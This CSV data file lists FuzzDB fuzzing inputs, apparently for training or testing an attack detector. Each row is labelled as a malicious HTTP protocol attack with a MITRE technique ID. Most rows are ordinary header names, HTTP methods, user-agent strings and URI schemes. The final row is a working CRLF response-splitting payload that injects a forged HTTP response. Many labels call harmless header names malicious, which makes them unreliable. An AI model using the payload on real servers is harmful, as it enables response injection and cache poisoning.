Payload,Signature,AttackType,Severity,MITRE,Label,Description
Content-Type,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cookie,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Expires,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
From,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
GET,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-None-Match,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Range,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Unmodified-Since,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
LOCK,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKCOL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Max-Forwards,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
NOTIFY,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
OPTIONS,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ORDERPATCH,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Origin,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POLL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
POST,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPFIND,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PUT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Pragma,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authorization,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Public-Key-Pins,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
REPORT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_IN_DATA,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_OUT_DATA,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Range,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Referer,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Refresh,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Retry-After,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SUBSCRIBE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Server,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Set-Cookie,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Status,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Strict-Transport-Security,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACK,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Trailer,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNSUBSCRIBE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6)),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.79 [en] (WinNT; U),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Opera/9.27 (Windows NT 5.1; U; en),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Vary,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
WWW-Authenticate,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Warning,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-ATT-DeviceId,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Security-Policy,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Type-Options,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-For,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-MS-ENUMATTS,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Powered-By,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Requested-With,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-UA-Compatible,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Wap-Profile,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-WebKit-CSP,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-XSS-Protection,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\\r\\n,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaa:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaas:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
about:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
acap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
afp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aim:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
apt:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aw:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
beshare:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bitcoin:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cid:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
content:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
crid:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cvs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
data:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dav:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dict:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dns:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
facetime:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fax:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
feed:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
file:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ftp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
geo:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gg:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
git:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gizmoproject:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
go:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gopher:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
http:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
https:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
icap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
im:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
imap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc6:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.beep:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
jar:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
javascript:,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
keyparc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lastfm:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldaps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lsid:,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
magnet:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mailto:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
maps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
message:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mid:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mms:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
modem:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mumble:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mupdate:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
news:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nfs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nntp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
notes:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
opaquelocktoken:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
paparazzi:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
platform:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pop:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pres:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
prospero:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
psyc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
query:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
